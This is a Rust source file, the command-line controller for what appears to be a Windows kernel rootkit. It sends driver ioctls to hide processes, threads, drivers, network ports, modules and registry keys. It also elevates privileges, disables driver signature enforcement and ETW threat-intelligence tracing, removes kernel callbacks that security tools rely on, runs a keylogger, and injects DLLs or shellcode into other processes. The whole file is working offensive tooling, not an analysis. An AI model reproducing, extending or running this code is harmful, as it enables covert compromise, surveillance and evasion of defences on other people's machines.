use cli::*;
use common::ioctls::*;
use clap::Parser;
use utils::{init_logger, BANNER};
use modules::{
    callback::Callback, 
    driver::Driver, 
    injection::Injection, 
    misc::Misc, 
    module::Module,
    network::Network, 
    process::Process, 
    thread::Thread,
};

#[cfg(not(feature = "mapper"))]
use modules::registry::Registry;

mod cli;
mod modules;
#[macro_use]
mod utils;

fn main() {
    let args = Cli::parse();
    init_logger(args.verbose);

    println!("{BANNER}");

    match &args.command {
        Commands::Process { sub_command } => {
            let mut process = Process::new();
    
            match sub_command {
                ProcessCommands::Elevate { pid } => {
                    process.elevate_process(Some(pid), ELEVATE_PROCESS);
                }
                ProcessCommands::Hide { pid } | ProcessCommands::Unhide { pid } => {
                    let hide = matches!(sub_command, ProcessCommands::Hide { .. });
                    process.hide_unhide_process(Some(pid), HIDE_UNHIDE_PROCESS, hide);
                }
                ProcessCommands::Terminate { pid } => {
                    process.terminate_process(Some(pid), TERMINATE_PROCESS);
                }
                ProcessCommands::Signature { pid, pt, sg } => {
                    process.signature_process(Some(pid), SIGNATURE_PROCESS, sg, pt);
                }
                #[cfg(not(feature = "mapper"))]
                ProcessCommands::Protection { pid, add, remove } => {
                    match (*add, *remove) {
                        (true, false) => process.protection_process(Some(pid), PROTECTION_PROCESS, true),
                        (false, true) => process.protection_process(Some(pid), PROTECTION_PROCESS, false),
                        _ => log::error!("No action provided"),
                    }
                }
                ProcessCommands::Enumerate { list, type_ } if *list => {
                    process.enumerate_process(ENUMERATION_PROCESS, type_);
                }
                _ => log::error!("Invalid or unsupported process command"),
            }
        }

        Commands::Thread { sub_command } => {
            let thread = Thread::new();
        
            match sub_command {
                ThreadCommands::Hide { tid } | ThreadCommands::Unhide { tid } => {
                    let hide = matches!(sub_command, ThreadCommands::Hide { .. });
                    thread.hide_unhide_thread(Some(tid), HIDE_UNHIDE_THREAD, hide);
                }
        
                #[cfg(not(feature = "mapper"))]
                ThreadCommands::Protection { tid, add, remove } => {
                    match (*add, *remove) {
                        (true, false) => thread.protection_thread(Some(tid), PROTECTION_THREAD, true),
                        (false, true) => thread.protection_thread(Some(tid), PROTECTION_THREAD, false),
                        _ => log::error!("No action provided"),
                    }
                }
        
                ThreadCommands::Enumerate { list, type_ } if *list => {
                    thread.enumerate_thread(ENUMERATION_THREAD, type_);
                }
        
                _ => log::error!("Invalid or unsupported thread command"),
            }
        }

        Commands::Driver { sub_command, hide, unhide, list, name } => {
            let driver = Driver::new();
            if *list {
                return driver.enumerate_driver(ENUMERATE_DRIVER);
            }
        
            if let Some(name) = name {
                if *hide || *unhide {
                    return driver.unhide_hide_driver(HIDE_UNHIDE_DRIVER, &name, *hide);
                }
            }

            match sub_command {
                Some(DriverCommands::Block { name, add, remove }) => {
                    if let Some(name) = name {
                        if *add || *remove{
                            driver.block_driver(BLOCK_DRIVER, name, *add);
                        } else {
                            log::warn!("You must specify either --add or --remove.");
                        }
                    }
                }, 
                None => {}
            }
        }

        Commands::Misc { sub_command } => {
            let misc = Misc::new();
        
            match sub_command {
                MisCommands::DSE { disable, enable } => {
                    match (*enable, *disable) {
                        (true, false) => misc.dse(ENABLE_DSE, true),
                        (false, true) => misc.dse(ENABLE_DSE, false),
                        _ => log::error!("No action provided"),
                    }
                }
                MisCommands::Keylogger { file } => misc.keylogger(KEYLOGGER, file),
                MisCommands::Etwti { disable, enable } => {
                    match (*enable, *disable) {
                        (true, false) => misc.etwti(ETWTI, true),
                        (false, true) => misc.etwti(ETWTI, false),
                        _ => log::error!("No action provided"),
                    }
                }
            }
        }        

        Commands::Network {
            hide,
            unhide,
            protocol,
            type_,
            port_number,
        } => {
            let network = Network::new();        
            if *hide || *unhide {
                network.hide_unhide_port(HIDE_PORT, *protocol, *type_, *port_number, *hide);
            } else {
                log::error!("No action provided. Use --hide or --unhide.");
            }
        }        

        #[cfg(not(feature = "mapper"))]
        Commands::Registry { sub_command } => {
            let registry = Registry::new();
        
            match sub_command {
                RegistryCommands::Protect { key, name, add, remove } => {
                    match (*add, *remove) {
                        (true, true) => log::error!("Both add and remove options cannot be specified at the same time"),
                        (true, false) | (false, true) => {
                            let action = *add;
                            let reg_type = if name.is_some() { REGISTRY_PROTECTION_VALUE } else { REGISTRY_PROTECTION_KEY };
                            let reg_name = name.clone().unwrap_or_else(|| "".to_string());
        
                            registry.registry_protection(reg_type, &reg_name, key, action);
                        }
                        _ => log::error!("Either add or remove must be specified"),
                    }
                }
        
                RegistryCommands::Hide { key, value } | RegistryCommands::Unhide { key, value } => {
                    let action = matches!(sub_command, RegistryCommands::Hide { .. });
                    let reg_type = if value.is_some() { HIDE_UNHIDE_VALUE } else { HIDE_UNHIDE_KEY };
                    let reg_name = value.clone().unwrap_or_else(|| "".to_string());
        
                    registry.registry_hide_unhide(reg_type, &reg_name, key, action);
                }
            }
        }        

        Commands::Module { sub_command } => {
            let module = Module::new();
            match sub_command {
                ModuleCommands::Enumerate { pid } => module.enumerate_module(ENUMERATE_MODULE, pid),
                ModuleCommands::Hide { name, pid } => module.hide_module(HIDE_MODULE, name, *pid),
            }
        }

        Commands::Callback {
            list,
            enumerate,
            remove,
            restore,
            callback,
        } => {
            let callbacks = Callback::new();
        
            if *list || *enumerate {
                let enum_type = if *list { ENUMERATE_CALLBACK } else { ENUMERATE_REMOVED_CALLBACK };
                callbacks.enumerate_callback(enum_type, callback);
                return;
            }
        
            match (remove, restore) {
                (Some(index), None) => callbacks.remove_callback(*index, REMOVE_CALLBACK, callback),
                (None, Some(index)) => callbacks.restore_callback(*index, RESTORE_CALLBACK, callback),
                (Some(_), Some(_)) => log::error!("Cannot remove and restore at the same time"),
                (None, None) => log::error!("No action provided for callback"),
            }
        }        

        Commands::Injection { sub_command } => {
            let injection = Injection::new();
            match sub_command {
                InjectionCommands::DLL { pid, path, type_ } => match type_ {
                    InjectionTypes::Thread => injection.injection(INJECTION_DLL_THREAD, pid, path),
                    InjectionTypes::APC => injection.injection(INJECTION_DLL_APC, pid, path),
                    InjectionTypes::ThreadHijacking => log::error!("No Supported")
                },
                InjectionCommands::Shellcode { pid, path, type_ } => match type_ {
                    InjectionTypes::Thread => injection.injection(INJECTION_SHELLCODE_THREAD, pid, path),
                    InjectionTypes::APC => injection.injection(INJECTION_SHELLCODE_APC, pid, path),
                    InjectionTypes::ThreadHijacking => injection.injection(INJECTION_SHELLCODE_THREAD_HIJACKING, pid, path)
                },
            }
        }
    }
}
